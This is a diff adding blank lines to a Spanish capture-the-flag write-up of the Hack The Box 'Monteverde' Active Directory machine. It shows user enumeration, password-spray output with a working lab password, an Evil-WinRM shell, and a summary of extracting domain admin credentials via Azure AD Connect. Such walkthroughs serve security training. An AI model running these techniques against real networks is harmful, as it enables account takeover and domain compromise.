@@ -35,6 +35,7 @@ image:
 `Monteverde` es una máquina `medium windows`, enumeramos `LDAP` y `RPC` obteniendo un `listado` de `usuarios`, a través de un `ataque` de `password spraying`, se descubre que la cuenta `SABatchJobs` tiene como `contraseña` el mismo `nombre` de `usuario`. Usando esta cuenta, es posible `enumerar` los recursos compartidos `SMB` en el sistema, y se encuentra que el recurso compartido `$users` es de lectura pública. Se halla un archivo `XML` utilizado para una `cuenta` de `Azure AD` dentro de una `carpeta` de `usuario` y `contiene` una `contraseña`. Debido a que se `reutilizan contraseñas`, es posible `conectarse` al `controlador` de `dominio` como `mhope` usando `WinRM`. La enumeración muestra que `Azure AD Connect` está instalado, por lo que es posible `extraer` las `credenciales` de la `cuenta` que `replica` los `cambios` del `directorio a Azure`, en este caso del `administrador` del `dominio`
 
 ---
+
 ## Reconocimiento
 
 Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
@@ -50,6 +51,7 @@ PING 10.129.228.111 (10.129.228.111) 56(84) bytes of data.
 3 packets transmitted, 3 received, 0% packet loss, time 2004ms
 rtt min/avg/max/mdev = 54.386/54.624/54.758/0.168 ms
 ```
+
 ### Nmap
 
 Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
@@ -153,6 +155,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 100.18 seconds
 ```
+
 ### RPC Enumeration
 
 `Enumeramos usuarios` del `dominio` con la herramienta de [https://github.com/rubenza02/rpcenumeration](https://github.com/rubenza02/rpcenumeration) y `guardamos` el `listado` de `usuarios` en un archivo
@@ -173,6 +176,7 @@ dgalanos          0xa35
 roleary           0xa36  
 smorgan           0xa37  
 ```
+
 ### LDAP Enumeration
 
 `Enumeramos` los `contextos` de `nombre` de `DNS` del `directorio activo`
@@ -244,6 +248,7 @@ dgalanos
 roleary
 smorgan
 ```
+
 ### SMB Enumeration
 
 `Obtenemos` el `nombre` de la `máquina` y el `dominio`
@@ -350,6 +355,7 @@ WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0
 WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$
 WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
 ```
+
 ## Intrusión
 
 `Accedemos` a la `máquina víctima` mediante el servicio `winrm`
@@ -367,6 +373,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\mhope\Documents> whoami
 megabank\mhope
 ```
+
 ## Privilege Escalation
 
 `Listamos` toda la `información` del `usuario` y vemos que el usuario `pertenece` al grupo `Azure Admins`
